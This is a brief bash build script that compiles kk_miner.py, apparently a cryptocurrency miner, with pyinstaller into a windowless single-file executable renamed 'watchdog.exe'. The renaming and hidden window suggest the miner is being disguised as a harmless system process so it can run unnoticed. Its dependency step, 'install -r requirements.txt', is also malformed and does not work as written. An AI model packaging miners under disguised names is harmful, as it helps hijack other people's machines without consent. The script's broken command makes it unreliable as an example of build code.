#!/bin/bash

echo "Checking dependancies..."

install -r requirements.txt

echo "Dependancies updated ready to build packages"

echo "Building packages..."

pyinstaller --onefile --windowed --name "watchdog" kk_miner.py

echo "kk_miner built as watchdog.exe"

echo "Building packages all complete"
